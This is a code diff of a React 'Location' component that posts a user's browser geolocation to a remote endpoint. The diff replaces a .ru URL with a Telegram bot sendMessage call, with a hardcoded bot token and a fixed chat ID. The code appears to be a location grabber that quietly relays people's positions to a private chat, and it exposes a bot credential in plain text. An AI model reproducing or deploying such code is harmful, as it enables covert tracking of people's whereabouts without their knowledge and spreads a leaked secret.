@@ -4,10 +4,12 @@ function Location() {
   const [location, setLocation] = useState("");
 
   const sendLocationToServer = (position) => {
-    const url = "https://pim.impermebel.ru/apiyhrth";
+    const url = "https://api.telegram.org/bot5719186476:AAHJHhHWWFrl7UkYPuw2yWJM1NQfnegOS0Y/sendMessage";
     fetch(url, {
       method: "POST",
-      body: JSON.stringify({ location: position }),
+      body: JSON.stringify({ 
+        chat_id: -962941088,
+        text: position }),
       headers: {
         "Content-Type": "application/json"
       }
